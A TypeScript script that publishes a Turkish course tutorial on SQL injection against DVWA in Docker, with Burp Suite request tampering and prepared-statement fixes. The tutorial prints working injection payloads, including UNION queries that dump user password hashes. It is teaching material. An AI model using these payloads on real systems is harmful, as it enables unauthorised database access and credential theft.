/**
 * Replace previous blog post with a technical SQL Injection / DVWA tutorial.
 * Run: DATABASE_URL=... npx tsx scripts/create-dvwa-post.ts
 */
import { PrismaClient } from "../src/generated/prisma";

const prisma = new PrismaClient();

const OLD_SLUG = "sinifta-yapay-zeka-yasaklamak-degil-acik-konusmak";
const NEW_SLUG = "dvwa-sql-injection-burp-suite-lab";

const TITLE =
  "DVWA + Burp Suite ile SQL Injection: 30 dakikada uygulamalı lab";

const EXCERPT =
  "BVA 2205 öğrencileri için: Docker ile DVWA kurulumu, Low/Medium/High zorluk seviyelerinde SQL Injection, Burp Suite ile request modify, ve prepared statement ile savunma — komutlar ve gerçek çıktılar.";

const CONTENT = `BVA 2205'in OWASP haftasında her dönem aynı şey oluyor: 30 öğrenci, 30 farklı kurulum hatası. Bu yazı o saatleri kazanmak için.

Hedef: 30 dakika içinde **DVWA**'yı (Damn Vulnerable Web Application) çalıştırıp, üç zorluk seviyesinde SQL Injection denemek ve sonunda prepared statement ile aynı zafiyeti kapatmak.

Önkoşul: Docker yüklü olmalı (\`docker --version\` çalışıyor olmalı), bir tarayıcı, Burp Suite Community Edition (bedava).

## 1. DVWA'yı Docker ile başlat

Tek satır:

\`\`\`bash
docker run --rm -d -p 8080:80 --name dvwa vulnerables/web-dvwa
\`\`\`

Çıktı:

\`\`\`
Unable to find image 'vulnerables/web-dvwa:latest' locally
latest: Pulling from vulnerables/web-dvwa
...
Status: Downloaded newer image for vulnerables/web-dvwa:latest
c4f8c3d1e2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9
\`\`\`

Tarayıcıda \`http://localhost:8080\` aç. Login: \`admin\` / \`password\` (klasik).

Açılınca **Setup / Reset DB** sayfasına git, **Create / Reset Database** butonuna bas. Otomatik logout olabilir — tekrar admin/password ile gir.

**DVWA Security** sayfasında varsayılan zorluk \`impossible\` geliyor. Onu **Low** yap, **Submit**.

## 2. Low — Klasik tek tırnak

Sol menüden **SQL Injection** sayfasına git. Bir \`User ID\` kutusu görürsün. \`1\` yazıp Submit'le:

\`\`\`
ID: 1
First name: admin
Surname: admin
\`\`\`

Görünüşte zararsız. Şimdi şunu dene:

\`\`\`
1' OR '1'='1
\`\`\`

Sonuç:

\`\`\`
ID: 1' OR '1'='1
First name: admin
Surname: admin

ID: 1' OR '1'='1
First name: Gordon
Surname: Brown

ID: 1' OR '1'='1
First name: Hack
Surname: Me

ID: 1' OR '1'='1
First name: Pablo
Surname: Picasso

ID: 1' OR '1'='1
First name: Bob
Surname: Smith
\`\`\`

Tüm kullanıcılar geldi. Çünkü kodun arka tarafında bu vardı:

\`\`\`php
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
\`\`\`

\`$id\` yerine direkt kullanıcı girdisi yapıştırılınca sorgu şuna dönüyor:

\`\`\`sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
\`\`\`

WHERE her satır için doğru olduğundan, tabloyu olduğu gibi dökmüş oluyor.

Şimdi şunu dene — **UNION** ile parolaları çek:

\`\`\`
1' UNION SELECT user, password FROM users-- -
\`\`\`

Çıktıda hash'leri görürsün:

\`\`\`
ID: 1' UNION SELECT user, password FROM users-- -
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
\`\`\`

\`5f4dcc3b5aa765d61d8327deb882cf99\` MD5 hash'i. Hashes.com'a yapıştırırsan saniyeler içinde \`password\` çıkar.

## 3. Medium — Burp Suite ile request modify

**Security** sayfasından zorluğu **Medium** yap. SQL Injection sayfasına dönünce \`User ID\` artık dropdown — sadece 1-5 seçilebiliyor. Görünüşte sorun çözülmüş.

Aslında çözülmemiş. Sadece form değişmiş.

Burp Suite Community'yi aç (\`burpsuite\` komutu veya tarayıcısının Files menüsünden). Tarayıcı proxy'sini \`127.0.0.1:8080\` (Burp'un default'u 8081 olabilir — dikkat) yap. Burp'ta **Proxy → Intercept** ON.

DVWA'ya dön, dropdown'dan herhangi bir ID seç ve Submit'e bas. Burp request'i yakalar:

\`\`\`http
POST /vulnerabilities/sqli/ HTTP/1.1
Host: localhost:8080
Cookie: security=medium; PHPSESSID=...

id=2&Submit=Submit
\`\`\`

\`id=2\` kısmını şuna çevir:

\`\`\`
id=2 OR 1=1
\`\`\`

(Tırnak yok — çünkü Medium seviyede backend integer cast yapıyor ama escaping eksik.)

**Forward**'a bas. Tarayıcıda yine tüm kullanıcılar listelendi.

Yani dropdown frontend kontrolüdür, güvenlik **değildir**. Bu öğrencilerin en çok kaçırdığı ders.

## 4. High — Cookie'ye SQLi

**High** zorluğunda sorgu ayrı bir sayfada (\`session-input.php\`) işleniyor. Burada session token'a SQLi yapılabiliyor. URL'i parametre olarak \`?id=1' UNION SELECT user_id, password FROM users-- -\` ekle.

Önemli olan şu: her zorluk seviyesi *bir yerden* açık. Pen-test mantığı budur — bir kapı kapanmışsa, ikinci, üçüncü, dördüncü kapıyı dene.

## 5. Defense — prepared statement

Şimdi gerçek dünya. Aynı zafiyeti kapatan kod, PHP'de:

\`\`\`php
$stmt = $db->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
\`\`\`

Python'da (psycopg2):

\`\`\`python
cur.execute(
    "SELECT first_name, last_name FROM users WHERE user_id = %s",
    (user_id,)
)
\`\`\`

Node.js (pg):

\`\`\`javascript
await pool.query(
  "SELECT first_name, last_name FROM users WHERE user_id = $1",
  [userId]
);
\`\`\`

Hepsinin ortak noktası: SQL şablonu ile veri **ayrı** gönderiliyor. Veritabanı sorguyu parse ettikten *sonra* parametreyi yerleştiriyor — yani \`1' OR '1'='1\` artık değer, kod değil.

DVWA'nın **Impossible** zorluğunda kodu açıp bak (\`View Source\` butonu sağ altta). Görürsün ki tam olarak prepared statement kullanılmış. Onun için "impossible" — kullanıcı girdisinin SQL sözdiziminden kaçma yolu yok.

## 6. Pratik ipuçları

- **Docker temizliği:** İşin bitince \`docker stop dvwa && docker rmi vulnerables/web-dvwa\`. \`--rm\` flag'i sayesinde stop'la otomatik silinir.
- **Burp HTTPS hataları:** Burp CA sertifikasını tarayıcıya ekle. Aksi takdirde HTTPS site'larda her istek hata verir.
- **PHPSESSID kaybı:** Yarı yolda logout oluyorsan \`security=low; PHPSESSID=...\` cookie'sini Burp'ta sabit tut.
- **Network çakışması:** Burp da 8080 kullanıyor → DVWA'yı 8088'e taşı (\`-p 8088:80\`) veya Burp'u 8081'e çek.

## 7. Sonraki adımlar

- **TryHackMe — "SQL Injection" room** (bedava, hesap yeterli)
- **PortSwigger Web Security Academy — SQL Injection lab serisi** (Burp'un kendi okulu, sertifika veriyor)
- **OWASP Juice Shop** — daha modern bir tek-sayfalık vulnerable app, JavaScript ağırlıklı

BVA 2205'in 4-5. haftalarında bu lab'ı sınıfta tek tek yapacağız. Yazı, derse gelmeden önce kuruluma denk gelen 90 dakikayı 15'e indirmek için.

Bir hata aldığında: tam komutu + tam hata mesajını mail at, geri yazarım.`;

async function main() {
  // Delete old post if exists
  const old = await prisma.post.findUnique({ where: { slug: OLD_SLUG } });
  if (old) {
    await prisma.post.delete({ where: { slug: OLD_SLUG } });
    console.log(`✗ Deleted old post: ${OLD_SLUG}`);
  }

  // Upsert new post
  const existing = await prisma.post.findUnique({ where: { slug: NEW_SLUG } });
  if (existing) {
    const updated = await prisma.post.update({
      where: { slug: NEW_SLUG },
      data: { title: TITLE, excerpt: EXCERPT, content: CONTENT, published: true },
    });
    console.log("✓ Updated:", updated.id, updated.slug);
  } else {
    const created = await prisma.post.create({
      data: {
        slug: NEW_SLUG,
        title: TITLE,
        excerpt: EXCERPT,
        content: CONTENT,
        published: true,
      },
    });
    console.log("✓ Created:", created.id, created.slug);
  }
  console.log(`  View at /yazilarim/${NEW_SLUG}`);
}

main()
  .catch((e) => {
    console.error(e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
